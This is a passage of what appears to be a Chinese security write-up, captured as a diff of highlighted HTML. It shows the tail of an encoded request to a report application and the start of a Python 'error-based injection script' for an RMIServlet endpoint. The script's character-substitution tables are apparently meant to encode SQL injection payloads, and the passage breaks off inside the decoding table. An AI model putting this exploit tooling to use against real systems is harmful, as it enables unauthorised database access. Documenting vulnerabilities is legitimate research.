class="n">AD</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">A1</span><span class="o">%</span><span class="n">AB</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">AD</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">B5</span><span class="o">%</span><span class="n">B7</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">B5</span><span class="o">%</span><span class="n">B7</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">B5</span><span class="o">%</span><span class="n">B7</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">AD</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">AD</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">AD</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">&amp;</span><span class="n">pageId</span><span class="o">=</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">writeBackData</span><span class="o">=&amp;</span><span class="n">exportSheetIndexes</span><span class="o">=&amp;</span><span class="n">exportId</span><span class="o">=&amp;</span><span class="n">op</span><span class="o">=%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">getTotalPages</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">Atrue</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">sheetPageCounts</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">5</span><span class="n">B1</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="0x02-rmiservet加密后注入">0x02 RMIServet加密后注入</h4>
+<p>报错注入脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#coding=utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span> <span class="n">import</span> <span class="n">quote</span><span class="p">,</span><span class="n">unquote</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">re</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span> <span class="n">import</span> <span class="n">InsecureRequestWarning</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#去除https的warning</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ENCODING_SCHEDULE</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="s2">&#34;u&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span> <span class="s2">&#34;K&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">:</span> <span class="s2">&#34;J&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">:</span> <span class="s2">&#34;M&#34;</span><span class="p">,</span> <span class="s2">&#34;7&#34;</span><span class="p">:</span> <span class="s2">&#34;9&#34;</span><span class="p">,</span> <span class="s2">&#34;8&#34;</span><span class="p">:</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;9&#34;</span><span class="p">:</span> <span class="s2">&#34;m&#34;</span><span class="p">,</span> <span class="s2">&#34;!&#34;</span><span class="p">:</span> <span class="s2">&#34;P&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;%&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">:</span> <span class="s2">&#34;n&#34;</span><span class="p">,</span> <span class="s2">&#34;(&#34;</span><span class="p">:</span> <span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;)&#34;</span><span class="p">:</span> <span class="s2">&#34;E&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">:</span> <span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="s2">&#34;+&#34;</span><span class="p">:</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;-&#34;</span><span class="p">:</span> <span class="s2">&#34;f&#34;</span><span class="p">,</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span> <span class="s2">&#34;q&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">:</span> <span class="s2">&#34;O&#34;</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span> <span class="s2">&#34;V&#34;</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="p">:</span> <span class="s2">&#34;t&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;D&#34;</span><span class="p">:</span> <span class="s2">&#34;T&#34;</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;F&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="s2">&#34;G&#34;</span><span class="p">:</span> <span class="s2">&#34;H&#34;</span><span class="p">,</span> <span class="s2">&#34;H&#34;</span><span class="p">:</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="s2">&#34;I&#34;</span><span class="p">:</span> <span class="s2">&#34;c&#34;</span><span class="p">,</span> <span class="s2">&#34;J&#34;</span><span class="p">:</span> <span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;K&#34;</span><span class="p">:</span> <span class="s2">&#34;l&#34;</span><span class="p">,</span> <span class="s2">&#34;L&#34;</span><span class="p">:</span> <span class="s2">&#34;8&#34;</span><span class="p">,</span> <span class="s2">&#34;M&#34;</span><span class="p">:</span> <span class="s2">&#34;F&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;O&#34;</span><span class="p">:</span> <span class="s2">&#34;o&#34;</span><span class="p">,</span> <span class="s2">&#34;P&#34;</span><span class="p">:</span> <span class="s2">&#34;L&#34;</span><span class="p">,</span> <span class="s2">&#34;Q&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span> <span class="s2">&#34;j&#34;</span><span class="p">,</span> <span class="s2">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;W&#34;</span><span class="p">,</span> <span class="s2">&#34;T&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;U&#34;</span><span class="p">:</span> <span class="s2">&#34;z&#34;</span><span class="p">,</span> <span class="s2">&#34;V&#34;</span><span class="p">:</span> <span class="s2">&#34;Z&#34;</span><span class="p">,</span> <span class="s2">&#34;W&#34;</span><span class="p">:</span> <span class="s2">&#34;!&#34;</span><span class="p">,</span> <span class="s2">&#34;X&#34;</span><span class="p">:</span> <span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">:</span> <span class="s2">&#34;)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Z&#34;</span><span class="p">:</span> <span class="s2">&#34;U&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="s2">&#34;(&#34;</span><span class="p">,</span> <span class="s2">&#34;b&#34;</span><span class="p">:</span> <span class="s2">&#34;~&#34;</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;i&#34;</span><span class="p">,</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span> <span class="s2">&#34;h&#34;</span><span class="p">,</span> <span class="s2">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;p&#34;</span><span class="p">,</span> <span class="s2">&#34;f&#34;</span><span class="p">:</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;g&#34;</span><span class="p">:</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;h&#34;</span><span class="p">:</span> <span class="s2">&#34;I&#34;</span><span class="p">,</span> <span class="s2">&#34;i&#34;</span><span class="p">:</span> <span class="s2">&#34;R&#34;</span><span class="p">,</span> <span class="s2">&#34;j&#34;</span><span class="p">:</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;k&#34;</span><span class="p">:</span> <span class="s2">&#34;G&#34;</span><span class="p">,</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span> <span class="s2">&#34;S&#34;</span><span class="p">,</span> <span class="s2">&#34;m&#34;</span><span class="p">:</span> <span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="s2">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;6&#34;</span><span class="p">,</span> <span class="s2">&#34;o&#34;</span><span class="p">:</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="s2">&#34;p&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span> <span class="s2">&#34;q&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="s2">&#34;s&#34;</span><span class="p">:</span> <span class="s2">&#34;D&#34;</span><span class="p">,</span> <span class="s2">&#34;t&#34;</span><span class="p">:</span> <span class="s2">&#34;k&#34;</span><span class="p">,</span> <span class="s2">&#34;u&#34;</span><span class="p">:</span> <span class="s2">&#34;Q&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;v&#34;</span><span class="p">:</span> <span class="s2">&#34;g&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="p">:</span> <span class="s2">&#34;C&#34;</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;z&#34;</span><span class="p">:</span> <span class="s2">&#34;X&#34;</span><span class="p">,</span> <span class="s2">&#34;~&#34;</span><span class="p">:</span> <span class="s2">&#34;e&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">:</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DECODING_SCHEDULE</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;7&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;u&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;K&#34;</span><span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="s2">&#34;J&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span> <span class="s2">&#34;M&#34;</span><span class="p">:</span> <span class="s2">&#34;6&#34;</span><span class="p">,</span> <span class="s2">&#34;9&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">:</span> <span class="s2">&#34;8&#34;</span><span class="p">,</span> <span class="s2">&#34;m&#34;</span><span class="p">:</span> <span class="s2">&#34;9&#34;</span><span class="p">,</span> <span class="s2">&#34;P&#34;</span><span class="p">:</span> <span class="s2">&#34;!&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/&#34;</span><span class="p">:</span> <span class="s2">&#34;%&#34;</span><span class="p">,</span> <span class="s2">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">:</span> <span class="s2">&#34;(&#34;</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="p">:</span> <span class="s2">&#34;)&#34;</span><span class="p">,</span> <span class="s2">&#34;s&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;+&#34;</span><span class="p">:</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;f&#34;</span><span class="p">:</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;q&#34;</span><span class="p">:</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;O&#34;</span><span class="p">:</span> <span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;V&#34;</span><span class="p">:</span> <span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="s2">&#34;t&#34;</span><span class="p">:</span> <span class="s2">&#34;C&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;T&#34;</span><span class="p">:</span> <span class="s2">&#34;D&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">:</span> <span class="s2">&#34;E&#34;</span><span class="p">,</span> <span class="s2">&#34;x&#34;</span><span class="p">:</span> <span class="s2">&#34;F&#34;</span><span class="p">,</span> <span class="s2">&#34;H&#34;</span><span class="p">:</span> <span class="s2">&#34;G&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span> <span class="s2">&#34;H&#34;</span><span class="p">,</span> <span class="s2">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;I&#34;</span><span class="p">,</span> <span class="s2">&#34;v&#34;</span><span class="p">:</span> <span class="s2">&#34;J&#34;</span><span class="p">,</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span> <span class="s2">&#34;K&#34;</span><span class="p">,</span> <span class="s2">&#34;8&#34;</span><span class="p">:</span> <span class="s2">&#34;L&#34;</span><span class="p">,</span> <span class="s2">&#34;F&#34;</span><span class="p">:</span> <span class="s2">&#34;M&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;o&#34;</span><span class="p">:</span> <span class="s2">&#34;O&#34;</span><span class="p">,</span> <span class="s2">&#34;L&#34;</span><span class="p">:</span> <span class="s2">&#34;P&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">:</span> <span class="s2">&#34;Q&#34;</span><span class="p">,</span> <span class="s2">&#34;j&#34;</span><span class="p">:</span> <span class="s2">&#34;R&#34;</span><span class="p">,</span> <span class="s2">&#34;W&#34;</span><span class="p">:</span> <span class="s2">&#34;S&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">:</span> <span class="s2">&#34;T&#34;</span><span class="p">,</span> <span class="s2">&#34;z&#34;</span><span class="p">:</span> <span class="s2">&#34;U&#34;</span><span class="p">,</span> <span class="s2">&#34;Z&#34;</span><span class="p">:</span> <span class="s2">&#34;V&#34;</span><span class="p">,</span> <span class="s2">&#34;!&#34;</span><span class="p">:</span> <span class="s2">&#34;W&#34;</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span> <span class="s2">&#34;X&#34;</span><span class="p">,</span> <span class="s2">&#34;)&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;U&#34;</span><span class="p">:</span> <span class="s2">&#34;Z&#34;</span><span class="p">,</span> <span class="s2">&#34;(&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;~&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;i&#34;</span><span class="p">:</span> <span class="s2">&#34;c&#34;</span><span class="p">,</span> <span class="s2">&#34;h&#34;</span><span class="p">:</span> <span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="s2">&#34;p&#34;</span><span class="p">:</span> <span class="s2">&#34;e&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">:</span> <span class="s2">&#34;f&#34;</span><span class="p">,</span> <span class="s2">&#34;-&#34;</span><span class="p">:</span> <span class="s2">&#34;g&#34;</span><span class="p">,</span> <span class="s2">&#34;I&#34;</span><span class="p">:</span> <span class="s2">&#34;h&#34;</span><span class="p">,</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span> <span class="s2">&#34;i&#34;</span><span class="p">,</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span> <span class="s2">&#34;j&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;G&#34;</span><span class="p">:</span> <span class="s2">&#34;k&#34;</span><span class="p">,</span> <span class="s2">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;l&#34;</span><span class="p">,</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span> <span class="s2">&#34;m&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">:</span> <span class="s2">&#34;n&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">:</span> <span class="s2">&#34;o&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">:</span> <span class="s2">&#34;p&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="s2">&#34;q&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="p">:</span> <span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="s2">&#34;k&#34;</span><span class="p">:</span> <span class="s2">&#34;t&#34;</span><span class="p">,</span> <span class="s2">&#34;Q&#34;</span><span class="p">:</span> <span class="s2">&#34;u&#34;</span><span class="p">,</span>
